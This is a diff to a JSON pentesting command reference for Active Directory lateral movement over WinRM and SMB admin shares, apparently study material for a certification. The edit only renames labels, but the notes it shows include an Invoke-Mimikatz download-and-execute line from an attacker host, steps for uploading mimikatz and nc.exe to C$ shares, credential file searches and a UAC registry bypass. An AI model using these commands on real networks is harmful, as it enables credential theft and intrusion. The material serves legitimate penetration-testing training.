@@ -3,7 +3,7 @@
     "category": "active-directory",
     "subcategory": "powershell-remoting",
     "description": "PowerShell remoting commands for lateral movement and remote administration",
-    "author": "OSCP Reference",
+    "author": "pentest Reference",
     "version": "1.0",
     "last_updated": "2025-11-09"
   },
@@ -18,8 +18,7 @@
         "ACTIVE_DIRECTORY",
         "POWERSHELL_REMOTING",
         "WINRM",
-        "LATERAL_MOVEMENT",
-        "OSCP:HIGH"
+        "LATERAL_MOVEMENT"
       ],
       "variables": [
         {
@@ -55,8 +54,7 @@
         "Connecting to remote server failed": "Firewall blocking port 5985 (HTTP) or 5986 (HTTPS). Test: Test-NetConnection <TARGET> -Port 5985",
         "TrustedHosts error": "Workgroup/IP-based connection requires TrustedHosts configuration: Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value <TARGET> -Force"
       },
-      "notes": "PowerShell remoting uses WinRM (Windows Remote Management) over HTTP port 5985 or HTTPS port 5986.\n\nRequires:\n(1) Local admin on target OR membership in Remote Management Users group, (2) WinRM service enabled (default on Server 2012+, disabled on workstations pre-Windows 10), (3) Firewall allows TCP 5985/5986.\n\nAdvantages over PsExec:\nUses native Windows service (less suspicious), supports pass-the-hash via Invoke-Command, allows script execution remotely.\n\nSession is fully interactive - TAB completion works, can run multi-line scripts.\n\nOSCP:\nPreferred lateral movement method when available - cleaner than PsExec, less likely to trigger AV.\n\nTest WinRM availability with Test-WSMan <TARGET> before attempting connection.",
-      "oscp_relevance": "high",
+      "notes": "PowerShell remoting uses WinRM (Windows Remote Management) over HTTP port 5985 or HTTPS port 5986.\n\nRequires:\n(1) Local admin on target OR membership in Remote Management Users group, (2) WinRM service enabled (default on Server 2012+, disabled on workstations pre-Windows 10), (3) Firewall allows TCP 5985/5986.\n\nAdvantages over PsExec:\nUses native Windows service (less suspicious), supports pass-the-hash via Invoke-Command, allows script execution remotely.\n\nSession is fully interactive - TAB completion works, can run multi-line scripts.\n\ncertification:\nPreferred lateral movement method when available - cleaner than PsExec, less likely to trigger AV.\n\nTest WinRM availability with Test-WSMan <TARGET> before attempting connection.",
       "methodology_guidance": {
         "after_success": "Enumerate system: whoami, hostname, systeminfo Search for credentials: dir C:\\Users\\*\\Desktop\\*.txt, findstr /SI password *.txt *.config Upload tools: Copy-Item -FromSession $session or via shares Exit session: Exit-PSSession"
       },
@@ -73,8 +71,7 @@
         "POWERSHELL_REMOTING",
         "WINRM",
         "LATERAL_MOVEMENT",
-        "COMMAND_EXECUTION",
-        "OSCP:HIGH"
+        "COMMAND_EXECUTION"
       ],
       "variables": [
         {
@@ -117,8 +114,7 @@
         "ScriptBlock syntax error": "Ensure proper PowerShell syntax inside {}. Test locally first: Invoke-Command -ComputerName localhost -ScriptBlock {...}",
         "Authentication error": "Pass credentials explicitly: -Credential (Get-Credential)"
       },
-      "notes": "Non-interactive alternative to Enter-PSSession.\n\nAdvantages:\n(1) Execute single commands without persistent session, (2) Run on multiple computers simultaneously (-ComputerName accepts arrays), (3) Return output to local console (vs interactive prompt).\n\nUse cases:\nQuick enumeration (whoami, ipconfig), download/execute scripts (IEX + DownloadString), mass credential dumping across multiple systems.\n\nSupports pass-the-hash when combined with Invoke-Mimikatz or Rubeus.\n\nScript execution:\nUse -FilePath to run local .ps1 files on remote systems (file is copied and executed).\n\nOSCP:\nUse for non-interactive command execution - faster than Enter-PSSession for single commands.\n\nCombine with PowerView for remote AD enumeration:\nInvoke-Command -ComputerName DC01 -ScriptBlock { Import-Module .\\PowerView.ps1; Get-NetUser }.",
-      "oscp_relevance": "high",
+      "notes": "Non-interactive alternative to Enter-PSSession.\n\nAdvantages:\n(1) Execute single commands without persistent session, (2) Run on multiple computers simultaneously (-ComputerName accepts arrays), (3) Return output to local console (vs interactive prompt).\n\nUse cases:\nQuick enumeration (whoami, ipconfig), download/execute scripts (IEX + DownloadString), mass credential dumping across multiple systems.\n\nSupports pass-the-hash when combined with Invoke-Mimikatz or Rubeus.\n\nScript execution:\nUse -FilePath to run local .ps1 files on remote systems (file is copied and executed).\n\ncertification:\nUse for non-interactive command execution - faster than Enter-PSSession for single commands.\n\nCombine with PowerView for remote AD enumeration:\nInvoke-Command -ComputerName DC01 -ScriptBlock { Import-Module .\\PowerView.ps1; Get-NetUser }.",
       "methodology_guidance": {
         "after_success": "Run enumeration: Invoke-Command -ComputerName <TARGET> -ScriptBlock { Get-NetUser } Execute Mimikatz: Invoke-Command -ComputerName <TARGET> -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://<LHOST>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz } Multi-host execution: Invoke-Command -ComputerName (Get-Content targets.txt) -ScriptBlock {...}"
       },
@@ -134,8 +130,7 @@
         "ACTIVE_DIRECTORY",
         "WINRM",
         "ENUMERATION",
-        "CONNECTIVITY",
-        "OSCP:HIGH"
+        "CONNECTIVITY"
       ],
       "variables": [
         {
@@ -175,8 +170,7 @@
         "Access is denied": "Authentication failure. Try with credentials: -Credential (Get-Credential). Check user is in Administrators or Remote Management Users group.",
         "WinRM cannot complete the operation": "WinRM service disabled. If you have admin access via other method (PsExec), enable: Enable-PSRemoting -Force"
       },
-      "notes": "Test-WSMan sends WS-Management identification request to target.\n\nIf WinRM service is running and accessible, returns service identification XML.\n\nDoes NOT require authentication to succeed - even if you don't have access, you'll see service info (proves service is running).\n\nAccess denied error = service running but authentication failed (good - means WinRM available, just need valid credentials).\n\nConnection refused = service not running or firewall blocking.\n\nUse this before attempting Enter-PSSession to avoid wasting time on non-WinRM targets.\n\nOSCP:\nQuick check before lateral movement.\n\nIf Test-WSMan succeeds, PowerShell remoting is viable.\n\nIf fails, pivot to PsExec, WMI, or DCOM methods.",
-      "oscp_relevance": "high",
+      "notes": "Test-WSMan sends WS-Management identification request to target.\n\nIf WinRM service is running and accessible, returns service identification XML.\n\nDoes NOT require authentication to succeed - even if you don't have access, you'll see service info (proves service is running).\n\nAccess denied error = service running but authentication failed (good - means WinRM available, just need valid credentials).\n\nConnection refused = service not running or firewall blocking.\n\nUse this before attempting Enter-PSSession to avoid wasting time on non-WinRM targets.\n\ncertification:\nQuick check before lateral movement.\n\nIf Test-WSMan succeeds, PowerShell remoting is viable.\n\nIf fails, pivot to PsExec, WMI, or DCOM methods.",
       "methodology_guidance": {
         "after_success": "If success: Use Enter-PSSession or Invoke-Command for lateral movement Alternative: Try PsExec, WMI, or DCOM lateral movement methods",
         "on_failure": "If failure: Check WinRM service status, firewall rules, authentication method"
@@ -193,8 +187,7 @@
         "ACTIVE_DIRECTORY",
         "POWERSHELL_REMOTING",
         "WINRM",
-        "CONFIGURATION",
-        "OSCP:MEDIUM"
+        "CONFIGURATION"
       ],
       "variables": [],
       "flag_explanations": {
@@ -220,8 +213,7 @@
         "Network connection type is set to Public": "Use -SkipNetworkProfileCheck flag OR change network profile: Set-NetConnectionProfile -NetworkCategory Private",
         "Unable to check firewall status": "Windows Firewall service disabled. Start: Start-Service mpssvc"
       },
-      "notes": "Enable-PSRemoting performs multiple configuration steps:\n(1) Starts WinRM service, (2) Sets WinRM to auto-start, (3) Creates HTTP listener on port 5985, (4) Creates firewall exception for WinRM ports, (5) Enables LocalAccountTokenFilterPolicy (allows remote admin via local accounts).\n\nNormally run on the system you want to RECEIVE remote connections (not attacker machine).\n\nIf you compromise a system via other means (RDP, PsExec) and want to enable WinRM for future access, run this command.\n\nRequires local admin.\n\nOSCP scenario:\nYou get RDP access to workstation where WinRM is disabled.\n\nEnable it for cleaner future access:\nEnable-PSRemoting -Force -SkipNetworkProfileCheck.\n\nNow you can use Enter-PSSession instead of RDP (less network traffic, more stealthy).",
-      "oscp_relevance": "medium",
+      "notes": "Enable-PSRemoting performs multiple configuration steps:\n(1) Starts WinRM service, (2) Sets WinRM to auto-start, (3) Creates HTTP listener on port 5985, (4) Creates firewall exception for WinRM ports, (5) Enables LocalAccountTokenFilterPolicy (allows remote admin via local accounts).\n\nNormally run on the system you want to RECEIVE remote connections (not attacker machine).\n\nIf you compromise a system via other means (RDP, PsExec) and want to enable WinRM for future access, run this command.\n\nRequires local admin.\n\ncertification scenario:\nYou get RDP access to workstation where WinRM is disabled.\n\nEnable it for cleaner future access:\nEnable-PSRemoting -Force -SkipNetworkProfileCheck.\n\nNow you can use Enter-PSSession instead of RDP (less network traffic, more stealthy).",
       "methodology_guidance": {
         "after_success": "Verify WinRM enabled: Test-WSMan Configure TrustedHosts if needed: Set-Item WSMan:\\localhost\\Client\\TrustedHosts -Value * -Force Test remote connectivity: Enter-PSSession -ComputerName <TARGET>"
       }
@@ -237,8 +229,7 @@
         "ENUMERATION",
         "SMB",
         "ADMIN_SHARES",
-        "LATERAL_MOVEMENT",
-        "OSCP:HIGH"
+        "LATERAL_MOVEMENT"
       ],
       "variables": [
         {
@@ -274,8 +265,7 @@
         "Network path not found": "Target offline, SMB disabled, or firewall blocking port 445. Test: Test-NetConnection <TARGET> -Port 445",
         "Access denied with valid admin": "UAC remote restrictions (Local Account Token Filter Policy). Workaround: Use domain admin account OR modify registry: reg add \\\\<TARGET>\\HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1"
       },
-      "notes": "Administrative shares (C$, ADMIN$, IPC$) are created automatically by Windows and only accessible to local Administrators group.\n\nC$ provides access to C:\ndrive root, ADMIN$ maps to C:\\Windows, IPC$ used for named pipes.\n\nTesting C$ access = testing local admin membership.\n\nWhy this works:\nSMB authentication uses current user context.\n\nIf Test-Path returns True, your credentials have local admin on target.\n\nThis is fast pre-check before attempting lateral movement tools (PsExec, WinRM) which all require local admin.\n\nOSCP workflow:\n(1) Find-LocalAdminAccess to discover admin access across domain, (2) Test-Path \\\\<TARGET>\\C$ to verify specific target, (3) Execute lateral movement.\n\nAlternative syntax:\ndir \\\\<TARGET>\\C$ (if succeeds = admin, if access denied = not admin).",
-      "oscp_relevance": "high",
+      "notes": "Administrative shares (C$, ADMIN$, IPC$) are created automatically by Windows and only accessible to local Administrators group.\n\nC$ provides access to C:\ndrive root, ADMIN$ maps to C:\\Windows, IPC$ used for named pipes.\n\nTesting C$ access = testing local admin membership.\n\nWhy this works:\nSMB authentication uses current user context.\n\nIf Test-Path returns True, your credentials have local admin on target.\n\nThis is fast pre-check before attempting lateral movement tools (PsExec, WinRM) which all require local admin.\n\ncertification workflow:\n(1) Find-LocalAdminAccess to discover admin access across domain, (2) Test-Path \\\\<TARGET>\\C$ to verify specific target, (3) Execute lateral movement.\n\nAlternative syntax:\ndir \\\\<TARGET>\\C$ (if succeeds = admin, if access denied = not admin).",
       "methodology_guidance": {
         "after_success": "If True: Use lateral movement (PsExec, WinRM, WMI, DCOM) List admin shares: net view \\\\<TARGET> Browse C$: dir \\\\<TARGET>\\C$\\Users\\ Upload tools: copy C:\\Tools\\mimikatz.exe \\\\<TARGET>\\C$\\Temp\\"
       },
@@ -292,8 +282,7 @@
         "SMB",
         "ADMIN_SHARES",
         "AUTHENTICATION",
-        "LATERAL_MOVEMENT",
-        "OSCP:HIGH"
+        "LATERAL_MOVEMENT"
       ],
       "variables": [
         {
@@ -356,8 +345,7 @@
         "Multiple connections error": "Existing connection to target. Disconnect first: net use \\\\<TARGET>\\C$ /delete OR net use * /delete /y (disconnect all)",
         "Network path not found": "SMB blocked or target offline. Check: Test-NetConnection <TARGET> -Port 445"
       },
-      "notes": "net use establishes authenticated SMB session to administrative shares.\n\nUnlike Test-Path (uses current credentials), net use allows explicit credential specification.\n\nUse cases:\n(1) Test credentials against target, (2) Authenticate with compromised account, (3) Switch user context (if already connected as different user, disconnect first).\n\nConnection persists until reboot OR explicit disconnect (net use /delete).\n\nFor local accounts (SAM database, not AD), use syntax:\n/user:.\\<USERNAME> where dot represents local machine.\n\nOSCP:\nUse to test credential validity after cracking passwords or finding credentials in files.\n\nSuccessful net use = valid local admin credentials.\n\nFollow with PsExec, WMI, or manual file operations via C$ share.",
-      "oscp_relevance": "high",
+      "notes": "net use establishes authenticated SMB session to administrative shares.\n\nUnlike Test-Path (uses current credentials), net use allows explicit credential specification.\n\nUse cases:\n(1) Test credentials against target, (2) Authenticate with compromised account, (3) Switch user context (if already connected as different user, disconnect first).\n\nConnection persists until reboot OR explicit disconnect (net use /delete).\n\nFor local accounts (SAM database, not AD), use syntax:\n/user:.\\<USERNAME> where dot represents local machine.\n\ncertification:\nUse to test credential validity after cracking passwords or finding credentials in files.\n\nSuccessful net use = valid local admin credentials.\n\nFollow with PsExec, WMI, or manual file operations via C$ share.",
       "methodology_guidance": {
         "after_success": "Browse share: dir \\\\<TARGET>\\C$\\Users\\ Upload files: copy C:\\Tools\\nc.exe \\\\<TARGET>\\C$\\Temp\\ Execute commands: wmic /node:<TARGET> /user:<DOMAIN>\\<USERNAME> /password:<PASSWORD> process call create \"cmd.exe /c <COMMAND>\" Disconnect: net use \\\\<TARGET>\\C$ /delete"
       },
@@ -373,8 +361,7 @@
         "ACTIVE_DIRECTORY",
         "ENUMERATION",
         "SMB",
-        "SHARES",
-        "OSCP:HIGH"
+        "SHARES"
       ],
       "variables": [
         {
@@ -424,8 +411,7 @@
         "Network path not found": "Invalid share name. List shares: net view \\\\<TARGET>",
         "System cannot find file specified": "Typo in path OR share doesn't exist. Common admin shares: C$, D$, ADMIN$ (Windows dir), IPC$ (named pipes)"
       },
-      "notes": "Simple file browsing via SMB.\n\nAdministrative shares (C$, ADMIN$) require local admin.\n\nRegular shares require explicit permissions.\n\nCommon reconnaissance patterns:\n(1) dir \\\\<TARGET>\\C$\\Users\\ - list user profiles (identify user accounts), (2) dir \\\\<TARGET>\\C$\\Users\\*\\Desktop\\ /s - find files on all user desktops, (3) dir \\\\<TARGET>\\C$\\inetpub\\wwwroot\\ - web server files (web.config credentials), (4) dir \\\\<TARGET>\\ADMIN$\\System32\\ - verify Windows directory access.\n\nUse /s for recursive search, /b for clean file lists (pipe to findstr).\n\nOSCP:\nAfter confirming admin access (Test-Path), use dir to enumerate sensitive locations.\n\nLook for:\ncredentials in Desktop/Documents, application configs in C:\\inetpub or C:\\Program Files, backup files in C:\\Temp or C:\\Backup.",
-      "oscp_relevance": "high",
+      "notes": "Simple file browsing via SMB.\n\nAdministrative shares (C$, ADMIN$) require local admin.\n\nRegular shares require explicit permissions.\n\nCommon reconnaissance patterns:\n(1) dir \\\\<TARGET>\\C$\\Users\\ - list user profiles (identify user accounts), (2) dir \\\\<TARGET>\\C$\\Users\\*\\Desktop\\ /s - find files on all user desktops, (3) dir \\\\<TARGET>\\C$\\inetpub\\wwwroot\\ - web server files (web.config credentials), (4) dir \\\\<TARGET>\\ADMIN$\\System32\\ - verify Windows directory access.\n\nUse /s for recursive search, /b for clean file lists (pipe to findstr).\n\ncertification:\nAfter confirming admin access (Test-Path), use dir to enumerate sensitive locations.\n\nLook for:\ncredentials in Desktop/Documents, application configs in C:\\inetpub or C:\\Program Files, backup files in C:\\Temp or C:\\Backup.",
       "methodology_guidance": {
         "after_success": "Search for sensitive files: dir \\\\<TARGET>\\C$ /s /b | findstr /I password config backup Browse user directories: dir \\\\<TARGET>\\C$\\Users\\ Download files: copy \\\\<TARGET>\\C$\\Users\\admin\\Desktop\\passwords.txt . Check for tools: dir \\\\<TARGET>\\C$\\Temp\\"
       },
@@ -442,8 +428,7 @@
         "FILE_TRANSFER",
         "SMB",
         "ADMIN_SHARES",
-        "LATERAL_MOVEMENT",
-        "OSCP:HIGH"
+        "LATERAL_MOVEMENT"
       ],
       "variables": [
         {
@@ -492,8 +477,7 @@
         "Not enough space": "Target disk full. Check: wmic /node:<TARGET> logicaldisk get size,freespace",
         "Network path not found": "SMB blocked or target offline"
       },
-      "notes": "Administrative share file transfer is core lateral movement technique.\n\nCommon pattern:\n(1) Verify admin access (Test-Path \\\\<TARGET>\\C$), (2) Upload tool (copy mimikatz.exe \\\\<TARGET>\\C$\\Temp\\), (3) Execute (PsExec/WMI), (4) Retrieve output/cleanup.\n\nWrite locations:\nC$\\Temp (C:\\Temp - usually writable), C$\\Windows\\Temp (C:\\Windows\\Temp - system temp), C$\\Users\\Public (C:\\Users\\Public - world-writable).\n\nAvoid C$\\ root (too obvious) or C$\\Windows\\System32 (protected).\n\nOSCP:\nThis is how you deploy Mimikatz, reverse shells, and enumeration tools to remote systems.\n\nAfter copy, use PsExec or WMI to execute.\n\nDon't forget cleanup:\ndel \\\\<TARGET>\\C$\\Temp\\mimikatz.exe after use.",
-      "oscp_relevance": "high",
+      "notes": "Administrative share file transfer is core lateral movement technique.\n\nCommon pattern:\n(1) Verify admin access (Test-Path \\\\<TARGET>\\C$), (2) Upload tool (copy mimikatz.exe \\\\<TARGET>\\C$\\Temp\\), (3) Execute (PsExec/WMI), (4) Retrieve output/cleanup.\n\nWrite locations:\nC$\\Temp (C:\\Temp - usually writable), C$\\Windows\\Temp (C:\\Windows\\Temp - system temp), C$\\Users\\Public (C:\\Users\\Public - world-writable).\n\nAvoid C$\\ root (too obvious) or C$\\Windows\\System32 (protected).\n\ncertification:\nThis is how you deploy Mimikatz, reverse shells, and enumeration tools to remote systems.\n\nAfter copy, use PsExec or WMI to execute.\n\nDon't forget cleanup:\ndel \\\\<TARGET>\\C$\\Temp\\mimikatz.exe after use.",
       "methodology_guidance": {
         "after_success": "Verify upload: dir \\\\<TARGET>\\C$\\<REMOTE_PATH> Execute uploaded file: PsExec.exe \\\\<TARGET> C:\\<REMOTE_PATH> Alternative execution: wmic /node:<TARGET> process call create \"C:\\<REMOTE_PATH>\" Download files: copy \\\\<TARGET>\\C$\\<REMOTE_PATH> <LOCAL_DESTINATION>"
       },
